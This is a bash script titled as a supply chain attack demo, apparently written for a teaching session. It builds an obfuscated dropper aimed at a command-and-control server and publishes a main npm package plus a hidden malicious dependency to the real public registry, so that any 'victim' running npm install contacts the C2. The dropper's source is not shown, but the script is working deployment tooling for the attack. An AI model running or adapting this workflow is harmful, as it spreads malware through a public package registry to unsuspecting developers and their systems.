#!/usr/bin/env bash
set -e

R='\033[31m' G='\033[32m' Y='\033[33m' C='\033[36m' B='\033[1m' D='\033[2m' X='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

echo ""
echo -e "${R}${B}  ╔═══════════════════════════════════════════════════════════╗${X}"
echo -e "${R}${B}  ║     PUBLISH TO REAL npm — Supply Chain Attack Demo        ║${X}"
echo -e "${R}${B}  ╚═══════════════════════════════════════════════════════════╝${X}"
echo ""

# --- Check npm login ---
NPM_USER=$(npm whoami 2>/dev/null || echo "")
if [ -z "$NPM_USER" ]; then
  echo -e "${R}  [!] You are not logged into npm.${X}"
  echo -e "  ${D}Run: npm login${X}"
  echo ""
  exit 1
fi
echo -e "  ${G}[✓]${X} Logged in as: ${B}${NPM_USER}${X}"
echo ""

# --- Validate scope is set ---
SCOPE="@${NPM_USER}"
FORM_PKG="${SCOPE}/csec-form-helpers"
CRYPTO_PKG="${SCOPE}/csec-crypto-utils"

FORM_DIR="$SCRIPT_DIR/csec-form-helpers"
CRYPTO_DIR="$SCRIPT_DIR/csec-crypto-utils"

grep -q "@yourname" "$FORM_DIR/package.json" && NEEDS_PATCH=1 || NEEDS_PATCH=0
grep -q "@yourname" "$CRYPTO_DIR/package.json" && NEEDS_PATCH=1

if [ "$NEEDS_PATCH" = "1" ]; then
  echo -e "  ${Y}[*]${X} Patching package names with your scope: ${B}${SCOPE}${X}"
  sed -i "s|@yourname/|${SCOPE}/|g" "$FORM_DIR/package.json"
  sed -i "s|@yourname/|${SCOPE}/|g" "$CRYPTO_DIR/package.json"
  sed -i "s|@yourname/|${SCOPE}/|g" "$CRYPTO_DIR/package.md"
  echo -e "  ${G}[✓]${X} Patched all package.json files"
  echo ""
fi

# --- Get C2 target ---
C2_TARGET="${1}"

if [ -z "$C2_TARGET" ]; then
  echo -e "  ${Y}[?]${X} Where is your C2 server running?"
  echo ""
  echo -e "  ${D}  Render:  ./publish.sh https://csec-c2.onrender.com${X}"
  echo -e "  ${D}  Local:   ./publish.sh 192.168.1.50 4444${X}"
  echo ""
  echo -e "  ${D}  Auto-detecting local IP...${X}"
  for cmd in "ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K[\d.]+'" \
             "hostname -I 2>/dev/null | awk '{print \$1}'" \
             "ifconfig 2>/dev/null | grep 'inet ' | grep -v 127.0.0.1 | head -1 | awk '{print \$2}'" \
             "ipconfig getifaddr en0 2>/dev/null"; do
    C2_TARGET=$(eval "$cmd" 2>/dev/null) && [ -n "$C2_TARGET" ] && break
  done

  if [ -z "$C2_TARGET" ]; then
    echo -e "${R}  [!] Could not detect your IP.${X}"
    echo -e "  ${D}Usage: ./publish.sh <C2_URL_OR_IP> [PORT]${X}"
    exit 1
  fi
fi

if echo "$C2_TARGET" | grep -qE '^https?://'; then
  echo -e "  ${C}${B}C2 target:${X} ${C2_TARGET} (remote)"
else
  C2_PORT="${2:-4444}"
  echo -e "  ${C}${B}C2 target:${X} ${C2_TARGET}:${C2_PORT} (local)"
fi
echo ""

# --- Build obfuscated dropper ---
echo -e "${Y}${B}  ── Step 1: Building obfuscated dropper ──${X}"
if [ -n "$C2_PORT" ]; then
  node "$SCRIPT_DIR/build-obfuscated.js" "$C2_TARGET" "$C2_PORT"
else
  node "$SCRIPT_DIR/build-obfuscated.js" "$C2_TARGET"
fi

# --- Publish hidden dependency first ---
echo -e "${Y}${B}  ── Step 2: Publishing ${CRYPTO_PKG} (hidden dependency) ──${X}"
cd "$CRYPTO_DIR"
npm publish --access public 2>&1 && \
  echo -e "  ${G}[✓]${X} Published ${CRYPTO_PKG}@4.2.1" || \
  echo -e "  ${Y}[!]${X} May already be published — check npm"
echo ""

# --- Publish main package ---
echo -e "${Y}${B}  ── Step 3: Publishing ${FORM_PKG} (main package) ──${X}"
cd "$FORM_DIR"
npm publish --access public 2>&1 && \
  echo -e "  ${G}[✓]${X} Published ${FORM_PKG}@1.0.0" || \
  echo -e "  ${Y}[!]${X} May already be published — check npm"
echo ""

# --- Done ---
echo -e "${G}${B}  ╔═══════════════════════════════════════════════════════════╗${X}"
echo -e "${G}${B}  ║                  PACKAGES PUBLISHED                       ║${X}"
echo -e "${G}${B}  ╚═══════════════════════════════════════════════════════════╝${X}"
echo ""
echo -e "  ${C}${B}Main package:${X}     npm install ${FORM_PKG}"
echo -e "  ${C}${B}Hidden dep:${X}       ${CRYPTO_PKG}@4.2.1 (pulled automatically)"
echo -e "  ${C}${B}C2 target:${X}        ${C2_TARGET}"
echo ""
echo -e "  ${Y}${B}── Victim just needs to run: ──${X}"
echo -e "  npm install ${FORM_PKG}"
echo ""
if echo "$C2_TARGET" | grep -qE '^https?://'; then
  echo -e "  ${D}C2 dashboard: ${C2_TARGET}${X}"
  echo -e "  ${D}(Make sure your Render service is deployed and running)${X}"
else
  echo -e "  ${D}Don't forget to start the C2 server:${X}"
  echo -e "  ${D}cd ../c2-server && node server.js${X}"
fi
echo ""
echo -e "  ${R}After the session, run: ./unpublish.sh${X}"
echo ""
